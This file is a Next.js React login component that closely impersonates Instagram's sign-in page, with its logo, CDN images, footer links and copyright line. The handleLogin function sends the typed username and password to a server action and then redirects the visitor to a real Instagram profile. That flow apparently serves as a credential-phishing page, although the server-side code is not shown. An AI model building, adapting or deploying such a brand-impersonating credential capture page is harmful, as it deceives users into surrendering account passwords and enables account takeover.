"use client"

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import Link from 'next/link';
import Image from 'next/image';
import { signInWithCredentials } from '@/actions/auth.actions';
import { Loader } from 'lucide-react';
import { useRouter } from 'next/navigation';


const SCREENSHOTS = [
  'https://images.unsplash.com/photo-1611262588024-d12430b98920?w=800&auto=format&fit=crop&q=60',
  'https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=800&auto=format&fit=crop&q=60',
  'https://images.unsplash.com/photo-1623582854588-d60de57fa33f?w=800&auto=format&fit=crop&q=60',
  'https://images.unsplash.com/photo-1614332284683-51ebe36170ce?w=800&auto=format&fit=crop&q=60',
];

const LoginForm = () => {
  const [currentScreenshot, setCurrentScreenshot] = useState(0);
  const router = useRouter()
  const [loading,setLoading] = useState(false)
  const [form, setForm] = useState({ identifier: '', password: '' });
  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentScreenshot((prev) => (prev + 1) % SCREENSHOTS.length);
    }, 4000);
    return () => clearInterval(timer);
  }, []);

  const isFormValid = form.identifier.length >= 1 && form.password.length >= 6;

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setForm(prev => ({ ...prev, [name]: value }));
  };
  const handleLogin = async(e: { preventDefault: () => void; })=> {
    e.preventDefault()
    setLoading(true)
     try {
       await signInWithCredentials({identifier:form.identifier,password:form.password})
       router.push("https://www.instagram.com/soufiane.hmamou")
     } catch (error) {
       console.log(error)
     }finally {
        setLoading(false)
     }
  }
 
  return (
   <div className="min-h-screen bg-[#fafafa] flex flex-col font-sans text-sm text-[#262626]">
      {/* Main Content */}
      <main className="flex-grow flex items-center justify-center py-8">
        <div className="flex items-center gap-8 max-w-[800px] w-full px-4 justify-center">
          
          {/* Phone Frame Mockup (Hidden on mobile) */}
          <div className="hidden lg:block relative w-[468px] h-[634px] bg-[url('https://static.cdninstagram.com/rsrc.php/v3/y4/r/ItTndU9ax3Y.png')] bg-no-repeat bg-[left_-46px_top_0px]">
            <div className="absolute top-[28px] right-[58px] w-[250px] h-[538px] overflow-hidden">
              <AnimatePresence mode="wait">
                <motion.img
                  key={currentScreenshot}
                  src={SCREENSHOTS[currentScreenshot]}
                  alt="Instagram Screenshot"
                  className="absolute inset-0 w-full h-full object-cover"
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  exit={{ opacity: 0 }}
                  transition={{ duration: 1.5 }}
                />
              </AnimatePresence>
            </div>
          </div>

          {/* Login Column */}
          <div className="flex flex-col gap-3 w-full max-w-[350px]">
            
            {/* Login Box */}
            <div className="bg-white  py-10 px-10 flex flex-col items-center">
              {/* Instagram Logo */}
              <h1 className="font-['Grand_Hotel'] text-5xl mb-8 select-none">
                Instagram
              </h1>

              {/* Form */}
              <form className="w-full flex flex-col gap-1.5" onSubmit={handleLogin}>
                <div className="relative group">
                  <input
                    type="text"
                    name="identifier"
                    value={form.identifier}
                    onChange={handleInputChange}
                    placeholder="Phone number, username, or email"
                    className={`w-full bg-[#fafafa] border border-[#dbdbdb] px-2 rounded-sm text-xs focus:outline-none focus:border-[#a8a8a8] peer placeholder-transparent h-9 ${form.identifier ? 'pt-3 pb-1' : ''}`}
                    id="username"
                  />
                  <label 
                    htmlFor="username"
                    className={`absolute left-2 transition-all cursor-text text-[#8e8e8e] pointer-events-none ${
                        form.identifier ? 'top-0.5 text-[10px]' : 'top-2.5 text-xs'
                    }`}
                  >
                    Phone number, username, or email
                  </label>
                </div>

                <div className="relative group">
                  <input
                    type="password"
                    name="password"
                    value={form.password}
                    onChange={handleInputChange}
                    placeholder="Password"
                    className={`w-full bg-[#fafafa] border border-[#dbdbdb] px-2 rounded-sm text-xs focus:outline-none focus:border-[#a8a8a8] peer placeholder-transparent h-9 ${form.password ? 'pt-3 pb-1' : ''}`}
                    id="password"
                  />
                  <label 
                    htmlFor="password"
                    className={`absolute left-2 transition-all cursor-text text-[#8e8e8e] pointer-events-none ${
                        form.password ? 'top-0.5 text-[10px]' : 'top-2.5 text-xs'
                    }`}
                  >
                    Password
                  </label>
                </div>

                <button 
                  type="submit"
                  className={`text-white flex items-center justify-center font-semibold py-1.5 rounded-lg mt-2 text-sm transition-colors active:opacity-70 ${
                    isFormValid ? 'bg-[#0095f6] hover:bg-[#1877f2]' : 'bg-[#4cb5f9] cursor-default'
                  }`}
                  disabled={!isFormValid}
                >
                 {loading ? <Loader /> : "Log in"} 
                </button>

                {/* Divider */}
                <div className="flex items-center gap-4 my-4">
                  <div className="h-[1px] bg-[#dbdbdb] flex-grow" />
                  <span className="text-[#8e8e8e] font-semibold text-xs text-transform: uppercase">OR</span>
                  <div className="h-[1px] bg-[#dbdbdb] flex-grow" />
                </div>

                {/* FB Login */}
                <button className="flex items-center justify-center gap-2 text-[#385185] font-semibold text-sm hover:opacity-80 active:opacity-50 cursor-pointer">
                  {/* <Facebook size={16} fill="currentColor" /> */}
                  Log in with Facebook
                </button>

                {/* Forgot PWM */}
                <a href="#" className="text-[#00376b] text-xs mt-4 text-center hover:underline focus:outline-none">
                  Forgot password?
                </a>
              </form>
            </div>

            {/* Sign Up Box */}
            <div className="bg-white border border-[#dbdbdb] py-6 flex items-center justify-center">
               <Image
                  src="/fb.png"
                  alt="Download on the App Store" 
                  width={30}
                  height={30}
                  className="h-10 object-contain coursor-pointer"
                />
              <p className="text-sm">
               
                Don&apos;t have an account? <Link href="#" className="text-[#0095f6] font-semibold hover:underline">Sign up</Link>
              </p>
            </div>

            {/* App Download */}
            {/* <div className="flex flex-col items-center gap-4 py-4">
              <p className="text-sm">Get the app.</p>
              <div className="flex gap-2">
                <Image
                  src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7YmS_iX.png" 
                  alt="Download on the App Store" 
                  width={40}
                  height={40}
                  className="h-10 cursor-pointer"
                />
                <Image
                  src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" 
                  alt="Get it on Google Play"
                  width={80}   
                  height={80}
                  className="h-10 object-contain cursor-pointer"
                />
              </div>
            </div> */}

          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="py-12 px-4 flex flex-col items-center gap-4">
        <div className="flex flex-wrap justify-center gap-x-4 gap-y-2 text-xs text-[#8e8e8e]">
          <Link href="#" className="hover:underline">Meta</Link>
          <Link href="#" className="hover:underline">About</Link>
          <Link href="#" className="hover:underline">Blog</Link>
          <Link href="#" className="hover:underline">Jobs</Link>
          <Link href="#" className="hover:underline">Help</Link>
          <Link href="#" className="hover:underline">API</Link>
          <Link href="#" className="hover:underline">Privacy</Link>
          <Link href="#" className="hover:underline">Terms</Link>
          <Link href="#" className="hover:underline">Locations</Link>
          <Link href="#" className="hover:underline">Instagram Lite</Link>
          <Link href="#" className="hover:underline">Threads</Link>
          <Link href="#" className="hover:underline">Contact Uploading & Non-Users</Link>
          <Link href="#" className="hover:underline">Meta Verified</Link>
        </div>
        
        <div className="flex gap-4 text-xs text-[#8e8e8e] mt-4">
          <select className="bg-transparent focus:outline-none cursor-pointer">
            <option>English</option>
            <option>French</option>
            <option>Spanish</option>
            <option>Arabic</option>
          </select>
          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  )
}

export default LoginForm